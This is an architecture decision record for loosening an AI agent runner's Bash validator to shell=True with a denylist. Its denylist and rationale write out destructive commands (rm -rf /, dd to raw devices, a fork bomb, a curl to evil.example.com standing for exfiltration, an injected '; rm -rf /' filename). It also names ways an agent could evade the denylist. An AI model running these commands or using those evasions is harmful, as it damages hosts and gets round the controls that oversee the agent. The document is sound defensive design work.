---
id: ADR-0014
title: Runner Bash handler — shell=True under cwd-locked BASE_DIR with denylist
status: Accepted
date: 2026-05-09
---

# ADR 0014 — Runner Bash handler: `shell=True` under cwd-locked `BASE_DIR` + denylist

**Status**: Accepted (2026-05-09, META OP-809)

**Decider**: sora (operator) + AI fleet

**Related**:
- OP-808 — META parent (audit follow-ups)
- OP-809 — this work (`A1`)
- Audit finding **B4** — original RCE concern that motivated the
  `shell=False` + shell-metacharacter blacklist baked into
  `backend/agents/runner_handlers.py` pre-OP-809
- ADR-0007 — multi-provider subscription orchestrator (defines the
  Sonnet 4.6 capacity model whose pilots wedged on the old validator)

---

## Context

`backend/agents/runner_handlers.py::bash_handler` previously ran every
command under `subprocess.run(argv, shell=False, cwd=BASE_DIR, …)` and
gated it through `_validate_bash_command`, which rejected the literal
shell metacharacters `|`, `&`, `;`, `(`, `)`, `<`, `>`, `$`, backtick,
`\n`, `\r`. That blacklist closed the audit-B4 RCE concern by making
shell injection impossible: with `shell=False`, the agent's command is
handed to `execvp` as a literal argv, so `;rm -rf /` smuggled into a
filename does nothing.

**The blacklist is the wrong shape for Sonnet 4.6.** Three pilots on
OP-32-equivalent tickets exhausted `max_iterations` because Sonnet kept
emitting `find | grep`, `cmd1 && cmd2`, and `python -c '...' > out.txt`
— the model has a deep prior that shell pipelines are the natural way
to compose tools, and no amount of system-prompt instruction unwound
it. Each retry hit `ValueError("shell metacharacter '|' is not
allowed")` and burned an iteration. The runner ended each pilot stuck,
not because the task was hard, but because the validator and the
model's command-generation prior were structurally misaligned.

We need a validator that lets the model's natural shell idioms through
while still preventing the catastrophes the original audit-B4 finding
named.

### Decision criteria

1. **Sonnet 4.6 must complete OP-32-equivalent tasks inside its
   iteration budget** — the immediate trigger for this work.
2. **Audit-B4 catastrophes still blocked** — `rm -rf /`,
   `dd if=/dev/sda`, fork bombs, `mount`/`umount`, network egress to
   non-allowlisted hosts.
3. **No new threat surface above what the runner already has** — i.e.
   the change must be defensible as *incremental* relative to the
   capabilities already on the table (Read/Write/Edit anywhere under
   `BASE_DIR`, plus arbitrary `python -c` execution).
4. **No reliance on a Linux LSM, seccomp, or container layer** — those
   exist in some deployments but not all; the validator must be
   self-contained at the Python layer.

## Decision

**Switch `bash_handler` to `subprocess.run(cmd, shell=True,
executable="/bin/bash", cwd=str(BASE_DIR), timeout=…)` and replace the
metacharacter blacklist with a denylist of catastrophic /
exfiltration-shaped patterns.** Everything else inside `BASE_DIR` is
allowed.

### What this ADR locks in

- **Shell mode**: `shell=True` on `/bin/bash`. Pipes, redirects,
  `&&`/`||`, `$(…)`, backticks, here-docs all work.
- **cwd lock**: every invocation runs with `cwd=str(BASE_DIR)`.
  Relative paths and redirect targets resolve under `BASE_DIR`. The
  cwd lock does **not** prevent the agent from writing absolute paths
  — that's covered by the denylist below + the audit-B4 acceptance
  argument.
- **Denylist** (pattern → reason):
  1. `rm -rf /` (and aliases `rm -fr`, `rm --recursive --force`),
     including chained forms like `echo hi; rm -rf /`. Targets matched
     are `/`, `/*`, and the top-level system dirs `/etc /var /usr /bin
     /sbin /lib /lib64 /boot /root /opt /dev /proc /sys /run /srv /mnt
     /media /home`.
  2. `dd if=/dev/…` and `dd of=/dev/…` (raw-block-device I/O).
  3. The canonical fork bomb `:(){ :|: & };:` (and obvious whitespace
     variants).
  4. `mount` / `umount` as a leading word of a shell statement
     (with optional `sudo` prefix).
  5. `curl` / `wget` egress: any URL whose host isn't in the loopback
     allowlist (`localhost`, `127.0.0.1`, `::1`, `0.0.0.0`,
     `host.docker.internal`). `curl --config …` (no parseable URL on
     argv) is also rejected, because we can't allowlist a host we
     can't see.
- **Empty / non-string commands**: rejected with the same
  `ValueError("non-empty"/"must be a string")` shape as before — the
  caller contract is unchanged.
- **`run_in_background`**: still rejected outright (the runner has no
  Monitor channel — see the existing handler docstring). Backgrounding
  is orthogonal to the shell-mode change.

### Audit-B4 risk re-evaluation

The original audit-B4 finding flagged the *injection vector* enabled
by `shell=True`: a filename like `'; rm -rf /'` substituted into a
command would execute as a separate statement. Two facts make this
threat surface incremental rather than new under OP-809:

1. **The runner already has BASE_DIR write authority via Write/Edit.**
   An agent that wants to delete the worktree just calls
   `Write({"file_path": "...", "content": ""})` in a loop, or invokes
   `Edit` to corrupt sources. There is no shell-mode change that
   *adds* worktree-corruption capability, because the capability was
   already present.
2. **The runner already has arbitrary code execution via
   `python -c`.** Even with `shell=False`, the previous handler
   accepted `python -c "import os; os.system('rm -rf /')"` as a single
   argv. The shell-metacharacter blacklist never blocked code-paths
   that went *through* an interpreter. The "no shell" defence was a
   shape-of-string defence, not a capability defence.

The denylist therefore targets the catastrophes that genuinely change
the operator's blast radius:

- **Out-of-`BASE_DIR` host damage** (`rm -rf /etc`, `dd of=/dev/sda`,
  `mount`) — these reach the host filesystem or kernel state, which
  is outside the runner's accepted authority.
- **Resource exhaustion against the host** (fork bomb).
- **Data exfiltration off the host** (`curl evil.example.com`).

Inside `BASE_DIR`, the agent's authority is unchanged.

### What this ADR explicitly does **not** lock in

- A bytecode-perfect denylist. A motivated agent could rename the fork
  bomb's function, write `rm` via `python -c`, or proxy egress through
  a localhost relay it just stood up. None of those are caught.
  Acceptance: the threat model assumes the agent is *not* adversarial;
  the denylist is a guardrail against accidental catastrophe and
  obvious supply-chain prompts, not a sandbox.
- A path-aware allow/deny for absolute targets inside the `rm -rf`
  argument. The current implementation pattern-matches on top-level
  dir names; an `rm -rf /home/foo/...` where `/home/foo` is *not*
  `BASE_DIR` is denied (false positive against the operator), and an
  `rm -rf /home/user/work/sora/OmniSight-claude-worktree/build`
  *is* denied even though it's inside `BASE_DIR`. That's intentionally
  conservative — the agent should use a relative path
  (`rm -rf build`) which the cwd lock handles correctly.
- A network-layer egress filter. The denylist is an argv-shape filter,
  not a packet filter. Operators that need real egress containment
  should layer a netns / firewall on top.

## Alternatives considered

### A. Tighten the blacklist + prompt-engineer Sonnet harder — rejected

Three pilots already proved the prompt-engineering ceiling. The model
has a strong prior that shell pipelines are the right idiom; pushing
back against it costs iterations on every task. Even if a smarter
prompt closed the gap on OP-32-equivalent tickets, the next harder
ticket would re-open it.

### B. Whitelist of allowed argv[0] commands — rejected

A whitelist of `find`, `grep`, `python`, `ls`, `cat`, `wc`, … keeps
`shell=False` and would have unblocked some of Sonnet's pilot
transcripts. But every new task adds a new argv[0] (`gh`, `jq`, `rg`,
`sed`, …) and the whitelist becomes a maintenance treadmill. Worse,
it doesn't address the structural problem: the model wants to
*compose* commands with `|`/`&&`, and a whitelist doesn't restore
composition.

### C. Run shell-mode commands inside a Linux netns + read-only bind
  mount of the host — rejected for this ADR

This is the right long-term answer if we ever decide the audit-B4
threat model needs hard isolation rather than incremental acceptance.
But it's a deployment-environment dependency (needs `unshare`/`bwrap`
available in every runner host, including the dev laptop) and it
doesn't help today's blocker — Sonnet-4.6 iteration exhaustion. We
keep it on the table as the migration target if the threat model
shifts.

### D. Validator extracts every absolute path from the command via a
  bash-syntax parser, then checks each against `BASE_DIR.realpath()` —
  rejected for tier budget

Real bash parsing (process substitution, here-docs, `eval`, exec)
isn't tractable in pure Python at the tier-M budget for this ticket.
The denylist on top-level dir names is the 90/10 cut.

## Consequences

**Positive**

- Sonnet 4.6 unwedges. `find | grep`, `cmd1 && cmd2`,
  `python -c '...' > out.txt` all run as the model wrote them — no
  retry, no iteration burn.
- The runner becomes a more honest model of `claude.ai/code`, where
  `Bash` is also a real shell. Behavioural drift between dev-loop and
  the deployed runner shrinks.
- Validator reasoning is now about **what the command does**, not
  **what punctuation it contains**. Easier to audit, easier to
  explain.

**Negative**

- The threat model is documented as accepting incremental-but-real
  risk: an attacker who controls the agent's prompts and is willing to
  escape the denylist's pattern-match can do more than under the
  blacklist. Mitigated by the audit-B4 acceptance argument, but still
  a real shift.
- The denylist is a regex-and-substring filter, not a syntax-aware
  check. False negatives are possible (renamed fork bomb, IP-literal
  egress to non-loopback addresses, command substitution that builds
  `rm -rf /` from fragments). Documented as residual risk.
- A few legitimate operator workflows are now denied as a side effect:
  - `rm -rf /home/user/.cache` inside the runner's transcript would be
    denied even if the operator means it. They should drop into a
    real shell for that.
  - `curl https://api.github.com/...` is denied; agents that need
    GitHub data should use the `gh` CLI which authenticates via the
    `git_accounts` table rather than going through the bash handler.

**Neutral**

- Existing `_ensure_inside_base` path-safety on Read/Write/Edit/Glob/
  Grep is unchanged. The shell-mode change is scoped to `Bash` only.
- The runner's argv-level `cwd=str(BASE_DIR)` lock is preserved. A
  command that *doesn't* `cd` will continue to operate inside
  `BASE_DIR`; the agent has to actively type an absolute path or `cd
  /elsewhere` to reach outside, which the denylist still polices for
  the catastrophic shapes.

**Reversibility**

If a future incident shows the denylist is insufficient, the
migration target is **alternative C** (netns + read-only bind mount).
Rough switching cost:

- 1 wrapper invocation change in `bash_handler`: prepend
  `bwrap --bind <BASE_DIR> /work --chdir /work --ro-bind / /host
  --proc /proc --tmpfs /tmp -- bash -c …`.
- 1 deploy dependency: `bubblewrap` package on every runner host
  (already present on most Linux distros).
- The denylist can stay as defence-in-depth or be removed once netns
  is the primary defence.

Estimated migration cost: 1 ticket, Tier M.
